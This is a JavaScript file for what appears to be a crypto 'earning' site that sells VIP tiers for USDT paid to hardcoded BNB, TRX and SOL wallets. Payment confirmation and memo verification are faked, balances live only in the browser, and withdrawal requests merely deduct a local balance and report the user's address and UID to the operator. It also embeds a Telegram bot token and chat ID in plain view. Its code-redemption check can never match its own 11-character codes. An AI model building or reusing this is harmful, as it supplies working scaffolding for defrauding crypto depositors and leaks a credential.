// === JAVASCRIPT CODE ===

// DOM Elements
const navItems = document.querySelectorAll('.nav-item');
const claimBtn = document.getElementById('claimBtn');
const buyVipBtns = document.querySelectorAll('.buy-vip');
const paymentModal = document.getElementById('paymentModal');
const closePaymentBtn = document.getElementById('closePaymentBtn');
const chainOptions = document.querySelectorAll('.chain-option');
const copyAddressBtn = document.getElementById('copyAddressBtn');
const confirmPaymentBtn = document.getElementById('confirmPaymentBtn');
const withdrawBtn = document.getElementById('withdrawBtn');
const claimVipCodeBtn = document.getElementById('claimVipCodeBtn');
const submitMemoBtn = document.getElementById('submitMemoBtn');
const fileUploadArea = document.getElementById('fileUploadArea');
const screenshotUpload = document.getElementById('screenshotUpload');

// User data
let userData = {
    balance: 0.00,
    todayEarnings: 0.00,
    totalEarned: 0.00,
    userStatus: 'free',
    dailyEarning: 0.10,
    lastClaim: null,
    vipExpiry: null,
    userId: 'USR738225',
    userName: 'User738225'
};

// VIP Codes (10 codes for VIP 2 - 60 USDT value)
const vipCodes = [
    { code: 'VIP60A7B9C1', used: false, value: 60 },
    { code: 'VIP60D2E3F4', used: false, value: 60 },
    { code: 'VIP60G5H6I7', used: false, value: 60 },
    { code: 'VIP60J8K9L0', used: false, value: 60 },
    { code: 'VIP60M1N2O3', used: false, value: 60 },
    { code: 'VIP60P4Q5R6', used: false, value: 60 },
    { code: 'VIP60S7T8U9', used: false, value: 60 },
    { code: 'VIP60V0W1X2', used: false, value: 60 },
    { code: 'VIP60Y3Z4A5', used: false, value: 60 },
    { code: 'VIP60B6C7D8', used: false, value: 60 }
];

// Sample users data
const sampleUsers = [
    { id: 'USR123456', name: 'John Crypto', status: 'vip', joinDate: '2024-01-15' },
    { id: 'USR789012', name: 'Sarah Blockchain', status: 'free', joinDate: '2024-01-20' },
    { id: 'USR345678', name: 'Mike Bitcoin', status: 'vip', joinDate: '2024-01-18' },
    { id: 'USR901234', name: 'Emma Ethereum', status: 'free', joinDate: '2024-01-22' },
    { id: 'USR567890', name: 'Alex Binance', status: 'vip', joinDate: '2024-01-16' },
    { id: 'USR112233', name: 'Lisa Coinbase', status: 'free', joinDate: '2024-01-21' },
    { id: 'USR445566', name: 'David Tron', status: 'vip', joinDate: '2024-01-19' },
    { id: 'USR778899', name: 'Sophia Solana', status: 'free', joinDate: '2024-01-23' }
];

// Wallet addresses
const walletAddresses = {
    bnb: '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    trx: 'TSKPhwUavSrKXXcbWG2TdPzYiBtoTNXP6i',
    sol: 'HvHR4LeKdCH5Z2UDKVSDuju8c4ukPAa1CzchHseZ2LKu'
};

// Telegram API
const telegramBotToken = '7659505060:AAFmwIDn2OgrtNoemPpmBWaxsIfdsQdZGCI';
const telegramChatId = '7417215529';

// Initialize the app
document.addEventListener('DOMContentLoaded', function() {
    loadUserData();
    updateUI();
    startCountdownTimer();
    setupTabNavigation();
    loadVIPCodes();
    loadUsersList();
    setupFileUpload();
    
    console.log('🚀 Platform initialized with VIP codes:', vipCodes.map(v => v.code));
});

// Load user data from localStorage
function loadUserData() {
    const savedData = localStorage.getItem('bnbEarningUserData');
    if (savedData) {
        userData = JSON.parse(savedData);
    }
    
    // Set last claim to now if not set
    if (!userData.lastClaim) {
        userData.lastClaim = new Date().toISOString();
        saveUserData();
    }
    
    // Generate user ID if not exists
    if (!userData.userId) {
        userData.userId = 'USR' + Math.floor(100000 + Math.random() * 900000);
        userData.userName = 'User' + userData.userId.slice(3);
        saveUserData();
    }
}

// Save user data to localStorage
function saveUserData() {
    localStorage.setItem('bnbEarningUserData', JSON.stringify(userData));
}

// Update UI with user data
function updateUI() {
    document.getElementById('userBalance').textContent = userData.balance.toFixed(2) + ' USDT';
    document.getElementById('todayEarnings').textContent = userData.todayEarnings.toFixed(2) + ' USDT';
    document.getElementById('totalEarned').textContent = userData.totalEarned.toFixed(2) + ' USDT';
    document.getElementById('dailyEarning').textContent = userData.dailyEarning.toFixed(2) + ' USDT';
    document.getElementById('userId').textContent = userData.userId;
    
    // Update user status
    const statusElement = document.getElementById('userStatus');
    if (userData.userStatus === 'vip') {
        statusElement.textContent = 'VIP User';
        statusElement.className = 'status-vip';
    } else {
        statusElement.textContent = 'Free User';
        statusElement.className = 'status-free';
    }
    
    updateClaimButton();
}

// Update claim button based on time
function updateClaimButton() {
    const now = new Date();
    const lastClaim = new Date(userData.lastClaim);
    const timeDiff = now - lastClaim;
    const hoursDiff = timeDiff / (1000 * 60 * 60);
    
    if (hoursDiff >= 24) {
        claimBtn.disabled = false;
        claimBtn.innerHTML = '<i class="fas fa-gift"></i> Claim Daily Earnings';
        claimBtn.classList.remove('btn-disabled');
    } else {
        claimBtn.disabled = true;
        claimBtn.classList.add('btn-disabled');
        const hoursLeft = 24 - hoursDiff;
        const hours = Math.floor(hoursLeft);
        const minutes = Math.floor((hoursLeft - hours) * 60);
        claimBtn.innerHTML = `<i class="fas fa-clock"></i> Next Claim: ${hours}h ${minutes}m`;
    }
}

// Start countdown timer
function startCountdownTimer() {
    setInterval(() => {
        updateClaimButton();
        
        // Update next claim countdown
        const now = new Date();
        const lastClaim = new Date(userData.lastClaim);
        const timeDiff = now - lastClaim;
        const hoursDiff = timeDiff / (1000 * 60 * 60);
        
        if (hoursDiff < 24) {
            const hoursLeft = 24 - hoursDiff;
            const hours = Math.floor(hoursLeft);
            const minutes = Math.floor((hoursLeft - hours) * 60);
            const seconds = Math.floor(((hoursLeft - hours) * 60 - minutes) * 60);
            
            document.getElementById('nextClaim').textContent = 
                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        } else {
            document.getElementById('nextClaim').textContent = '00:00:00';
        }
    }, 1000);
}

// Setup tab navigation
function setupTabNavigation() {
    navItems.forEach(item => {
        item.addEventListener('click', function() {
            // Remove active class from all items
            navItems.forEach(nav => nav.classList.remove('active'));
            
            // Add active class to clicked item
            this.classList.add('active');
            
            // Get the tab name
            const tabName = this.getAttribute('data-tab');
            
            // Show/hide sections based on tab
            document.querySelectorAll('.container > div').forEach(section => {
                if (section.classList.contains('header') || section.classList.contains('balance-card')) {
                    // Always show header and balance
                    return;
                }
                
                if (section.classList.contains(tabName + '-card') || 
                    (tabName === 'home' && (section.classList.contains('earning-card') || section.classList.contains('vip-card')))) {
                    section.style.display = 'block';
                } else {
                    section.style.display = 'none';
                }
            });
        });
    });
}

// Load VIP codes
function loadVIPCodes() {
    const codesList = document.getElementById('vipCodesList');
    codesList.innerHTML = '';
    
    vipCodes.forEach(vipCode => {
        const codeElement = document.createElement('div');
        codeElement.className = `vip-code-item ${vipCode.used ? 'used' : 'available'}`;
        codeElement.textContent = vipCode.code;
        codeElement.title = vipCode.used ? 'Already used' : 'Click to copy';
        
        if (!vipCode.used) {
            codeElement.addEventListener('click', function() {
                copyToClipboard(vipCode.code);
                showNotification(`VIP code ${vipCode.code} copied to clipboard!`, 'success');
            });
        }
        
        codesList.appendChild(codeElement);
    });
}

// Load users list
function loadUsersList() {
    const usersList = document.getElementById('usersList');
    usersList.innerHTML = '';
    
    sampleUsers.forEach(user => {
        const userElement = document.createElement('div');
        userElement.className = 'user-item';
        userElement.innerHTML = `
            <div class="user-info-small">
                <div class="user-name">${user.name}</div>
                <div class="user-id">${user.id}</div>
            </div>
            <div class="user-status ${user.status === 'vip' ? 'status-badge-vip' : 'status-badge-free'}">
                ${user.status === 'vip' ? 'VIP' : 'FREE'}
            </div>
        `;
        usersList.appendChild(userElement);
    });
}

// Setup file upload
function setupFileUpload() {
    fileUploadArea.addEventListener('click', function() {
        screenshotUpload.click();
    });
    
    screenshotUpload.addEventListener('change', function(e) {
        const file = e.target.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function(e) {
                const filePreview = document.getElementById('filePreview');
                filePreview.innerHTML = `<img src="${e.target.result}" alt="Screenshot Preview">`;
                filePreview.style.display = 'block';
            };
            reader.readAsDataURL(file);
        }
    });
}

// Claim daily earnings
claimBtn.addEventListener('click', function() {
    if (this.disabled) return;
    
    userData.balance += userData.dailyEarning;
    userData.todayEarnings += userData.dailyEarning;
    userData.totalEarned += userData.dailyEarning;
    userData.lastClaim = new Date().toISOString();
    
    saveUserData();
    updateUI();
    
    showNotification(`Successfully claimed ${userData.dailyEarning} USDT!`, 'success');
    sendTelegramMessage(`User ${userData.userId} claimed ${userData.dailyEarning} USDT`);
});

// Buy VIP button click
buyVipBtns.forEach(btn => {
    btn.addEventListener('click', function() {
        const tier = this.getAttribute('data-tier');
        const price = this.getAttribute('data-price');
        
        document.getElementById('paymentTitle').textContent = `Buy ${tier.toUpperCase()} - ${price} USDT`;
        document.getElementById('paymentModal').setAttribute('data-tier', tier);
        document.getElementById('paymentModal').setAttribute('data-price', price);
        
        // Set memo
        const memo = `${tier}_${userData.userId}`;
        document.getElementById('memoDisplay').textContent = memo;
        
        paymentModal.style.display = 'flex';
        document.body.style.overflow = 'hidden';
    });
});

// Close payment modal
closePaymentBtn.addEventListener('click', function() {
    paymentModal.style.display = 'none';
    document.body.style.overflow = 'auto';
    resetPaymentModal();
});

// Chain option selection
chainOptions.forEach(option => {
    option.addEventListener('click', function() {
        chainOptions.forEach(opt => opt.classList.remove('active'));
        this.classList.add('active');
        
        const chain = this.getAttribute('data-chain');
        const addressDisplay = document.getElementById('addressDisplay');
        const tier = document.getElementById('paymentModal').getAttribute('data-tier');
        const memo = `${tier}_${userData.userId}`;
        
        addressDisplay.innerHTML = `
            <strong>${chain.toUpperCase()} Address:</strong><br>
            <span style="user-select: all;">${walletAddresses[chain]}</span>
            <br><br>
            <strong>Memo Required:</strong> ${memo}
        `;
        addressDisplay.style.display = 'block';
        
        copyAddressBtn.disabled = false;
    });
});

// Copy address to clipboard
copyAddressBtn.addEventListener('click', function() {
    const addressDisplay = document.getElementById('addressDisplay');
    const addressText = addressDisplay.textContent;
    
    copyToClipboard(addressText);
    showNotification('Address and memo copied to clipboard!', 'success');
});

// Confirm payment
confirmPaymentBtn.addEventListener('click', function() {
    const tier = paymentModal.getAttribute('data-tier');
    const price = parseFloat(paymentModal.getAttribute('data-price'));
    
    const selectedChain = document.querySelector('.chain-option.active');
    if (!selectedChain) {
        showNotification('Please select a payment method', 'error');
        return;
    }
    
    activateVIP(tier, price);
    
    paymentModal.style.display = 'none';
    document.body.style.overflow = 'auto';
    resetPaymentModal();
});

// Activate VIP
function activateVIP(tier, price) {
    userData.userStatus = 'vip';
    
    if (tier === 'vip1') {
        userData.dailyEarning = 1.00;
    } else if (tier === 'vip2') {
        userData.dailyEarning = 7.00;
    }
    
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + 30);
    userData.vipExpiry = expiryDate.toISOString();
    
    saveUserData();
    updateUI();
    
    showNotification(`VIP activated successfully! Daily earning: ${userData.dailyEarning} USDT`, 'success');
    sendTelegramMessage(`User ${userData.userId} purchased ${tier} for ${price} USDT`);
}

// Reset payment modal
function resetPaymentModal() {
    chainOptions.forEach(opt => opt.classList.remove('active'));
    document.getElementById('addressDisplay').style.display = 'none';
    copyAddressBtn.disabled = true;
}

// Claim VIP code
claimVipCodeBtn.addEventListener('click', function() {
    const codeInput = document.getElementById('vipCodeInput').value.trim().toUpperCase();
    
    if (!codeInput) {
        showNotification('Please enter a VIP code', 'error');
        return;
    }
    
    if (codeInput.length !== 10) {
        showNotification('VIP code must be 10 characters', 'error');
        return;
    }
    
    const vipCode = vipCodes.find(vc => vc.code === codeInput);
    
    if (!vipCode) {
        showNotification('Invalid VIP code', 'error');
        return;
    }
    
    if (vipCode.used) {
        showNotification('This VIP code has already been used', 'error');
        return;
    }
    
    // Activate VIP 2
    vipCode.used = true;
    userData.userStatus = 'vip';
    userData.dailyEarning = 7.00;
    
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + 30);
    userData.vipExpiry = expiryDate.toISOString();
    
    saveUserData();
    updateUI();
    loadVIPCodes();
    
    showNotification(`VIP 2 activated with code ${codeInput}! Daily earning: 7 USDT`, 'success');
    sendTelegramMessage(`User ${userData.userId} claimed VIP code: ${codeInput}`);
    
    // Clear input
    document.getElementById('vipCodeInput').value = '';
});

// Submit memo verification
submitMemoBtn.addEventListener('click', function() {
    const memoId = document.getElementById('memoId').value.trim();
    const transactionHash = document.getElementById('transactionHash').value.trim();
    const screenshotFile = screenshotUpload.files[0];
    
    if (!memoId) {
        showNotification('Please enter payment memo ID', 'error');
        return;
    }
    
    if (!screenshotFile) {
        showNotification('Please upload payment screenshot', 'error');
        return;
    }
    
    // Simulate verification process
    showNotification('Payment verification submitted! Processing...', 'success');
    
    // In real app, you would upload to server
    setTimeout(() => {
        showNotification('Payment verified successfully! VIP activated.', 'success');
        
        // Clear form
        document.getElementById('memoId').value = '';
        document.getElementById('transactionHash').value = '';
        document.getElementById('filePreview').innerHTML = '';
        document.getElementById('filePreview').style.display = 'none';
        screenshotUpload.value = '';
    }, 2000);
    
    sendTelegramMessage(`User ${userData.userId} submitted memo: ${memoId}`);
});

// Withdraw funds
withdrawBtn.addEventListener('click', function() {
    const amount = parseFloat(document.getElementById('withdrawAmount').value);
    const coin = document.getElementById('withdrawCoin').value;
    const address = document.getElementById('withdrawAddress').value.trim();
    const uid = document.getElementById('withdrawUid').value.trim();
    
    if (!amount || amount <= 0) {
        showNotification('Please enter a valid amount', 'error');
        return;
    }
    
    if (userData.userStatus === 'free' && amount > 0.02) {
        showNotification('Free users can only withdraw up to 0.02 USDT', 'error');
        return;
    }
    
    if (amount > userData.balance) {
        showNotification('Insufficient balance', 'error');
        return;
    }
    
    if (!address) {
        showNotification('Please enter withdrawal address', 'error');
        return;
    }
    
    if (!uid) {
        showNotification('Please enter your UID', 'error');
        return;
    }
    
    userData.balance -= amount;
    saveUserData();
    updateUI();
    
    showNotification(`Withdrawal request submitted for ${amount} ${coin.toUpperCase()}. Processing within 24 hours.`, 'success');
    sendTelegramMessage(`Withdrawal: ${amount} ${coin} to ${address} (UID: ${uid})`);
    
    // Clear form
    document.getElementById('withdrawAmount').value = '';
    document.getElementById('withdrawAddress').value = '';
    document.getElementById('withdrawUid').value = '';
});

// Utility functions
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).catch(err => {
        console.error('Failed to copy text: ', err);
    });
}

function showNotification(message, type) {
    const notification = document.createElement('div');
    notification.className = `notification ${type === 'error' ? 'error' : ''}`;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${type === 'success' ? 'var(--success-color)' : 'var(--danger-color)'};
        color: white;
        padding: 15px 20px;
        border-radius: 10px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        z-index: 3000;
        max-width: 300px;
        animation: slideInRight 0.5s ease;
    `;
    
    notification.innerHTML = `
        <div style="display: flex; align-items: center;">
            <i class="fas fa-${type === 'success' ? 'check' : 'exclamation'}-circle" style="margin-right: 10px;"></i>
            <div>${message}</div>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.style.animation = 'slideInRight 0.5s ease reverse';
        setTimeout(() => {
            notification.remove();
        }, 500);
    }, 3000);
}

function sendTelegramMessage(message) {
    // Simulate Telegram API call
    console.log('📱 Telegram:', message);
    
    // In production, use:
    /*
    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: telegramChatId,
            text: message,
            parse_mode: 'HTML'
        })
    });
    */
}

// Export VIP codes for external use
window.getVIPCodes = function() {
    return vipCodes.filter(vc => !vc.used).map(vc => vc.code);
};

console.log('VIP Codes ready:', vipCodes.map(v => ({ code: v.code, used: v.used })));
